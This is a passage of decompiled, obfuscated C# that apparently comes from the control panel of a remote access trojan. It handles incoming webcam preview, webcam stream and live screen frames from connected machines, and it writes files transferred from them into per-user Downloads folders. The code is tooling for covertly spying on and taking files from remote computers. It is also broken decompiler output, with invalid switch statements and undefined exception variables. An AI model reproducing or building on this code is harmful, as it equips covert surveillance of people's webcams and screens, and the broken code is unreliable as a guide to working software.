											cclient72.lLastPreviewScreenFrame = lLastPreviewScreenFrame;
										}
									}
								}
								else
								{
									Class130.concurrentDictionary_3[cclient69.SCREEN_PREVIEW_USER_KEY].fPr.method_21();
								}
								cclient69.mPacket.SetLength(0L);
							}
							catch (Exception ex12)
							{
								cclient69.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.WEBCAM_PREVIEW_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient73 = Class130.concurrentDictionary_3[cclient2.WEBCAM_PREVIEW_USER_KEY];
					ptr2 = ref cclient73.stats_bytes_in;
					cclient73.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient74 = cclient2;
							try
							{
								if (!cclient74.IS_SSL)
								{
									cclient74.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient74.WEBCAM_PREVIEW_USER_KEY].fPr.method_17();
								Class130.concurrentDictionary_3[cclient74.WEBCAM_PREVIEW_USER_KEY].fPr.vmethod_0().Image = Image.FromStream(new MemoryStream(cclient74.mPacket.ToArray()));
								if (Class135.smethod_0().PreviewDisplayFrameData)
								{
									CClient cclient75 = cclient74;
									ref long ptr7 = ref cclient75.lPreviewWebcamFPS;
									cclient75.lPreviewWebcamFPS = ptr7 + 1L;
									CClient cclient76 = cclient74;
									ref double ptr8 = ref cclient76.dPreviewWebcamFPSAvgSize;
									unchecked
									{
										cclient76.dPreviewWebcamFPSAvgSize = ptr8 + (double)cclient74.mPacket.Length;
										Class136.Struct27 @struct = default(Class136.Struct27);
										@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
										bool flag4 = false;
										if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
										{
											flag4 = true;
										}
										long num24;
										if (flag4)
										{
											num24 = Class136.GetTickCount64();
										}
										else
										{
											num24 = (long)Class136.GetTickCount();
										}
										if (checked(num24 - cclient74.lLastPreviewWebcamFrame) >= 1000L)
										{
											Class130.concurrentDictionary_3[cclient74.WEBCAM_PREVIEW_USER_KEY].fPr.method_18(cclient74.lPreviewWebcamFPS, (double)cclient74.mPacket.Length, cclient74.dPreviewWebcamFPSAvgSize);
											cclient74.lPreviewWebcamFPS = 0L;
											cclient74.dPreviewWebcamFPSAvgSize = 0.0;
											CClient cclient77 = cclient74;
											@struct = default(Class136.Struct27);
											@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
											flag4 = false;
											if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
											{
												flag4 = true;
											}
											if (flag4)
											{
												num24 = Class136.GetTickCount64();
											}
											else
											{
												num24 = (long)Class136.GetTickCount();
											}
											long lLastPreviewWebcamFrame = num24;
											cclient77.lLastPreviewWebcamFrame = lLastPreviewWebcamFrame;
										}
									}
								}
								else
								{
									Class130.concurrentDictionary_3[cclient74.WEBCAM_PREVIEW_USER_KEY].fPr.method_21();
								}
								cclient74.mPacket.SetLength(0L);
							}
							catch (Exception ex13)
							{
								cclient74.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.WEBCAMSTREAM_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient78 = Class130.concurrentDictionary_3[cclient2.WEBCAMSTREAM_USER_KEY];
					ptr2 = ref cclient78.stats_bytes_in;
					cclient78.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient79 = cclient2;
							try
							{
								if (!cclient79.IS_SSL)
								{
									cclient79.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient79.WEBCAMSTREAM_USER_KEY].fDB.vmethod_264().Image = Image.FromStream(new MemoryStream(cclient79.mPacket.ToArray()));
								CClient cclient80 = Class130.concurrentDictionary_3[cclient79.WEBCAMSTREAM_USER_KEY];
								double num25 = (double)cclient79.mPacket.Length;
								cclient80.WEBCAM_FPS_UPDATE(ref num25);
								cclient79.mPacket.SetLength(0L);
							}
							catch (Exception ex14)
							{
								cclient79.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.SCREENLIVE_SECONDARY_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient81 = Class130.concurrentDictionary_3[cclient2.SCREENLIVE_SECONDARY_USER_KEY];
					ptr2 = ref cclient81.stats_bytes_in;
					cclient81.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient82 = cclient2;
							try
							{
								if (!cclient82.IS_SSL)
								{
									cclient82.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient82.SCREENLIVE_SECONDARY_USER_KEY].fDB.vmethod_248().Image = Image.FromStream(new MemoryStream(cclient82.mPacket.ToArray()));
								cclient82.mPacket.SetLength(0L);
							}
							catch (Exception ex15)
							{
								cclient82.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.FILE_TRANSFER_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient83 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
					ptr2 = ref cclient83.stats_bytes_in;
					cclient83.stats_bytes_in = ptr2 + (double)num;
					cclient2.FILE_TRANSFER_DL_DATA.Write(ptr, 0, num);
					CClient cclient84 = cclient2;
					ref long ptr9 = ref cclient84.FILE_TRANSFER_POS;
					cclient84.FILE_TRANSFER_POS = checked(ptr9 + unchecked((long)num));
					CClient cclient85 = cclient2;
					ptr2 = ref cclient85.FILE_TRANSFER_SPEED_COUNTER;
					cclient85.FILE_TRANSFER_SPEED_COUNTER = ptr2 + (double)num;
					CClient cclient86 = cclient2;
					ptr9 = ref cclient86.FILE_TRANSFER_PACKETS;
					cclient86.FILE_TRANSFER_PACKETS = checked(ptr9 + 1L);
					string left;
					bool flag3;
					bool ptr10;
					double num28;
					int num30;
					string text6;
					int num31;
					long num48;
					string ptr12;
					if (ptr.Length >= 16 || Operators.CompareString(Encoding.UTF8.GetString(ptr, 0, num), "FL_UP_OK", true) != 0)
					{
						if (!Class130.concurrentDictionary_10.ContainsKey(cclient2.sKey))
						{
							Class130.concurrentDictionary_10.TryAdd(cclient2.sKey, cclient2.sKey);
						}
						if (cclient2.FILE_TRANSFER_DL_DATA.Length >= 33554432L)
						{
							bool flag2;
							byte[] byte_;
							string string_16;
							Class136.Class142 class3;
							if (File.Exists(string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient2.FILE_TRANSFER_USER,
								"\\",
								cclient2.FILE_TRANSFER_FILENAME
							})))
							{
								string text3 = string.Concat(new string[]
								{
									Application.StartupPath,
									"\\Downloads\\",
									cclient2.FILE_TRANSFER_USER,
									"\\",
									cclient2.FILE_TRANSFER_FILENAME
								});
								byte[] array5 = cclient2.FILE_TRANSFER_DL_DATA.ToArray();
								flag2 = true;
								byte_ = array5;
								string_16 = text3;
								class3 = new Class136.Class142();
								class3.string_0 = string_16;
								class3.byte_0 = byte_;
								class3.bool_0 = true;
								try
								{
									if (flag2)
									{
										new Thread(new ThreadStart(class3._Lambda$__0)).Start();
									}
									else
									{
										Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
									}
									goto IL_38AC;
								}
								catch (Exception ex16)
								{
									goto IL_38AC;
								}
							}
							string text4 = string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient2.FILE_TRANSFER_USER,
								"\\",
								cclient2.FILE_TRANSFER_FILENAME
							});
							byte[] array6 = cclient2.FILE_TRANSFER_DL_DATA.ToArray();
							flag2 = true;
							byte_ = array6;
							string_16 = text4;
							class3 = new Class136.Class142();
							class3.string_0 = string_16;
							class3.byte_0 = byte_;
							class3.bool_0 = false;
							try
							{
								if (flag2)
								{
									new Thread(new ThreadStart(class3._Lambda$__0)).Start();
								}
								else
								{
									Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
								}
							}
							catch (Exception ex17)
							{
							}
							IL_38AC:
							cclient2.FILE_TRANSFER_DL_DATA.SetLength(0L);
						}
						if ((double)Class136.smethod_36() - (double)cclient2.FILE_TRANSFER_LAST_PACKET > 1000.0)
						{
							cclient2.FILE_TRANSFER_ELAPSED = (double)cclient2.FILE_TRANSFER_LAST_PACKET - cclient2.FILE_TRANSFER_STARTED;
							cclient2.FILE_TRANSFER_SPEED_AVG = (double)cclient2.FILE_TRANSFER_POS / (cclient2.FILE_TRANSFER_ELAPSED / 1000.0);
							long long_ = checked((long)Math.Round(unchecked(Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE) - (double)cclient2.FILE_TRANSFER_POS) / cclient2.FILE_TRANSFER_SPEED_AVG));
							fTransferManager fTransferManager_ = Class130.fTransferManager_0;
							string file_TRANSFER_ID = cclient2.FILE_TRANSFER_ID;
							int num26 = 2;
							double num27 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
							flag3 = false;
							ptr10 = ref flag3;
							num28 = num27;
							int num29 = num26;
							string string_19 = file_TRANSFER_ID;
							fTransferManager fTransferManager = fTransferManager_;
							object obj;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_3ADE:
								goto IL_3B2E;
								IL_3AE0:
								text6 = "0 B";
								goto IL_3ADE;
								IL_3AE9:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_3AFF:;
							}
							catch when (endfilter(obj is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex18 = (Exception)obj2;
								goto IL_3AE9;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_3B2E:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string string_20 = text6;
							fTransferManager.method_16(string_19, num29, string_20);
							fTransferManager fTransferManager_2 = Class130.fTransferManager_0;
							string file_TRANSFER_ID2 = cclient2.FILE_TRANSFER_ID;
							int num32 = 3;
							double num33 = (double)cclient2.FILE_TRANSFER_POS;
							flag3 = false;
							ptr10 = ref flag3;
							num28 = num33;
							int num34 = num32;
							string string_21 = file_TRANSFER_ID2;
							fTransferManager fTransferManager2 = fTransferManager_2;
							object obj3;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_3CE7:
								goto IL_3D37;
								IL_3CE9:
								text6 = "0 B";
								goto IL_3CE7;
								IL_3CF2:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_3D08:;
							}
							catch when (endfilter(obj3 is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex19 = (Exception)obj4;
								goto IL_3CF2;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_3D37:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string str13 = text6;
							fTransferManager2.method_16(string_21, num34, str13 + " (" + Conversions.ToString(Math.Round((double)cclient2.FILE_TRANSFER_POS / Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE) * 100.0, 2)) + "%)");
							fTransferManager fTransferManager_3 = Class130.fTransferManager_0;
							string file_TRANSFER_ID3 = cclient2.FILE_TRANSFER_ID;
							int num35 = 4;
							double file_TRANSFER_SPEED_COUNTER = cclient2.FILE_TRANSFER_SPEED_COUNTER;
							flag3 = false;
							ptr10 = ref flag3;
							num28 = file_TRANSFER_SPEED_COUNTER;
							int num36 = num35;
							string text7 = file_TRANSFER_ID3;
							fTransferManager fTransferManager3 = fTransferManager_3;
							object obj5;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_3F28:
								goto IL_3F78;
								IL_3F2A:
								text6 = "0 B";
								goto IL_3F28;
								IL_3F33:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_3F49:;
							}
							catch when (endfilter(obj5 is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex20 = (Exception)obj6;
								goto IL_3F33;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_3F78:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string text8 = text6;
							fTransferManager fTransferManager4 = fTransferManager3;
							string text9 = text7;
							int num37 = num36;
							string text10 = text8;
							string text11 = "/s (Avg. ";
							double file_TRANSFER_SPEED_AVG = cclient2.FILE_TRANSFER_SPEED_AVG;
							flag3 = false;
							ptr10 = ref flag3;
							num28 = file_TRANSFER_SPEED_AVG;
							string str14 = text11;
							string str15 = text10;
							int num38 = num37;
							string string_22 = text9;
							fTransferManager fTransferManager5 = fTransferManager4;
							object obj7;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_4127:
								goto IL_4177;
								IL_4129:
								text6 = "0 B";
								goto IL_4127;
								IL_4132:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_4148:;
							}
							catch when (endfilter(obj7 is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex21 = (Exception)obj8;
								goto IL_4132;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_4177:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string str16 = text6;
							fTransferManager5.method_16(string_22, num38, str15 + str14 + str16 + "/s)");
							Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 6, Class136.smethod_35(checked((long)Math.Round(cclient2.FILE_TRANSFER_ELAPSED / 1000.0)), true));
							Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, Class136.smethod_35(long_, true));
							Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
							fMain ff5 = cclient2.ff;
							CClient cclient87 = cclient2;
							ref string ptr11 = ref cclient87.FILE_TRANSFER_USER_KEY;
							object value3 = cclient87.FILE_TRANSFER_USER_KEY;
							ff5.method_24(ref value3);
							ptr11 = Conversions.ToString(value3);
							cclient2.FILE_TRANSFER_SPEED_COUNTER = 0.0;
							cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
						}
						if ((double)cclient2.FILE_TRANSFER_POS == Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE))
						{
							fTransferManager fTransferManager_4 = Class130.fTransferManager_0;
							string file_TRANSFER_ID4 = cclient2.FILE_TRANSFER_ID;
							int num39 = 2;
							double num40 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
							flag3 = false;
							ptr10 = ref flag3;
							num28 = num40;
							int num41 = num39;
							string string_23 = file_TRANSFER_ID4;
							fTransferManager fTransferManager6 = fTransferManager_4;
							object obj9;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_43F6:
								goto IL_4446;
								IL_43F8:
								text6 = "0 B";
								goto IL_43F6;
								IL_4401:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_4417:;
							}
							catch when (endfilter(obj9 is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex22 = (Exception)obj10;
								goto IL_4401;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_4446:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string string_24 = text6;
							fTransferManager6.method_16(string_23, num41, string_24);
							fTransferManager fTransferManager_5 = Class130.fTransferManager_0;
							string file_TRANSFER_ID5 = cclient2.FILE_TRANSFER_ID;
							int num42 = 3;
							double num43 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
							flag3 = false;
							ptr10 = ref flag3;
							num28 = num43;
							int num44 = num42;
							string string_25 = file_TRANSFER_ID5;
							fTransferManager fTransferManager7 = fTransferManager_5;
							object obj11;
							try
							{
								ProjectData.ClearProjectError();
								num30 = 2;
								string text5 = string.Empty;
								if (num28 >= 1099511627776.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
								}
								else if (num28 >= 1073741824.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
								}
								else if (num28 >= 1048576.0)
								{
									text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
								}
								else if (num28 >= 1024.0)
								{
									text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
								}
								else if (num28 < 1024.0)
								{
									text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
								}
								if (ptr10)
								{
									text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
								}
								if (text5.Length > 0)
								{
									text6 = text5;
								}
								else
								{
									text6 = " 0 B";
								}
								IL_4603:
								goto IL_4653;
								IL_4605:
								text6 = "0 B";
								goto IL_4603;
								IL_460E:
								num31 = -1;
								@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
								IL_4624:;
							}
							catch when (endfilter(obj11 is Exception & num30 != 0 & num31 == 0))
							{
								Exception ex23 = (Exception)obj12;
								goto IL_460E;
							}
							throw ProjectData.CreateProjectError(-2146828237);
							IL_4653:
							if (num31 != 0)
							{
								ProjectData.ClearProjectError();
							}
							string str17 = text6;
							fTransferManager7.method_16(string_25, num44, str17 + " (100%)");
							if (cclient2.FILE_TRANSFER_ELAPSED / 1000.0 == 0.0)
							{
								fTransferManager fTransferManager_6 = Class130.fTransferManager_0;
								string file_TRANSFER_ID6 = cclient2.FILE_TRANSFER_ID;
								int num45 = 4;
								double num46 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
								flag3 = false;
								ptr10 = ref flag3;
								num28 = num46;
								int num47 = num45;
								string string_26 = file_TRANSFER_ID6;
								fTransferManager fTransferManager8 = fTransferManager_6;
								object obj13;
								try
								{
									ProjectData.ClearProjectError();
									num30 = 2;
									string text5 = string.Empty;
									if (num28 >= 1099511627776.0)
									{
										text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
									}
									else if (num28 >= 1073741824.0)
									{
										text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
									}
									else if (num28 >= 1048576.0)
									{
										text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
									}
									else if (num28 >= 1024.0)
									{
										text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
									}
									else if (num28 < 1024.0)
									{
										text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
									}
									if (ptr10)
									{
										text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
									}
									if (text5.Length > 0)
									{
										text6 = text5;
									}
									else
									{
										text6 = " 0 B";
									}
									IL_4839:
									goto IL_4889;
									IL_483B:
									text6 = "0 B";
									goto IL_4839;
									IL_4844:
									num31 = -1;
									@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
									IL_485A:;
								}
								catch when (endfilter(obj13 is Exception & num30 != 0 & num31 == 0))
								{
									Exception ex24 = (Exception)obj14;
									goto IL_4844;
								}
								throw ProjectData.CreateProjectError(-2146828237);
								IL_4889:
								if (num31 != 0)
								{
									ProjectData.ClearProjectError();
								}
								string str18 = text6;
								fTransferManager8.method_16(string_26, num47, str18 + "/s");
							}
							Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Completed");
							Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
							Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
							Class130.fTransferManager_0.method_26();
							Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
							fMain ff6 = cclient2.ff;
							CClient cclient88 = cclient2;
							ref string ptr11 = ref cclient88.FILE_TRANSFER_USER_KEY;
							object value3 = cclient88.FILE_TRANSFER_USER_KEY;
							ff6.method_24(ref value3);
							ptr11 = Conversions.ToString(value3);
							bool flag2;
							byte[] byte_;
							string string_16;
							Class136.Class142 class3;
							if (File.Exists(string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient2.FILE_TRANSFER_USER,
								"\\",
								cclient2.FILE_TRANSFER_FILENAME
							})))
							{
								string text12 = string.Concat(new string[]
								{
									Application.StartupPath,
									"\\Downloads\\",
									cclient2.FILE_TRANSFER_USER,
									"\\",
									cclient2.FILE_TRANSFER_FILENAME
								});
								byte[] array7 = cclient2.FILE_TRANSFER_DL_DATA.ToArray();
								flag2 = true;
								byte_ = array7;
								string_16 = text12;
								class3 = new Class136.Class142();
								class3.string_0 = string_16;
								class3.byte_0 = byte_;
								class3.bool_0 = true;
								try
								{
									if (flag2)
									{
										new Thread(new ThreadStart(class3._Lambda$__0)).Start();
									}
									else
									{
										Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
									}
									goto IL_4ADD;
								}
								catch (Exception ex25)
								{
									goto IL_4ADD;
								}
							}
							string text13 = string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient2.FILE_TRANSFER_USER,
								"\\",
								cclient2.FILE_TRANSFER_FILENAME
							});
							byte[] array8 = cclient2.FILE_TRANSFER_DL_DATA.ToArray();
							flag2 = true;
							byte_ = array8;
							string_16 = text13;
							class3 = new Class136.Class142();
							class3.string_0 = string_16;
							class3.byte_0 = byte_;
							class3.bool_0 = false;
							try
							{
								if (flag2)
								{
									new Thread(new ThreadStart(class3._Lambda$__0)).Start();
								}
								else
								{
									Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
								}
							}
							catch (Exception ex26)
							{
							}
							IL_4ADD:
							cclient2.FILE_TRANSFER_DL_DATA.SetLength(0L);
							left = string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient2.FILE_TRANSFER_USER,
								"\\",
								cclient2.FILE_TRANSFER_FILENAME
							});
							num48 = Conversions.ToLong(cclient2.FILE_TRANSFER_FILE_LAST_MODIFIED);
							ptr12 = ref left;
							if (File.Exists(ptr12))
							{
								DateTime dateTime = new DateTime(1970, 1, 1);
								try
								{
									File.SetLastWriteTimeUtc(ptr12, dateTime.AddSeconds((double)num48));
								}
								catch (Exception ex27)
								{
								}
							}
							cclient2.FILE_TRANSFER_COMPLETED = true;
							CClient cclient89 = cclient2;
							flag3 = true;
							cclient89.SOCKET_DISCONNECT(ref flag3);
						}
						return;
					}
					fTransferManager fTransferManager_7 = Class130.fTransferManager_0;
					string file_TRANSFER_ID7 = cclient2.FILE_TRANSFER_ID;
					int num49 = 2;
					double num50 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
					flag3 = false;
					ptr10 = ref flag3;
					num28 = num50;
					int num51 = num49;
					string string_27 = file_TRANSFER_ID7;
					fTransferManager fTransferManager9 = fTransferManager_7;
					object obj15;
					try
					{
						ProjectData.ClearProjectError();
						num30 = 2;
						string text5 = string.Empty;
						if (num28 >= 1099511627776.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num28 >= 1073741824.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num28 >= 1048576.0)
						{
							text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num28 >= 1024.0)
						{
							text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
						}
						else if (num28 < 1024.0)
						{
							text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
						}
						if (ptr10)
						{
							text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
						}
						if (text5.Length > 0)
						{
							text6 = text5;
						}
						else
						{
							text6 = " 0 B";
						}
						IL_30E2:
						goto IL_3132;
						IL_30E4:
						text6 = "0 B";
						goto IL_30E2;
						IL_30ED:
						num31 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
						IL_3103:;
					}
					catch when (endfilter(obj15 is Exception & num30 != 0 & num31 == 0))
					{
						Exception ex28 = (Exception)obj16;
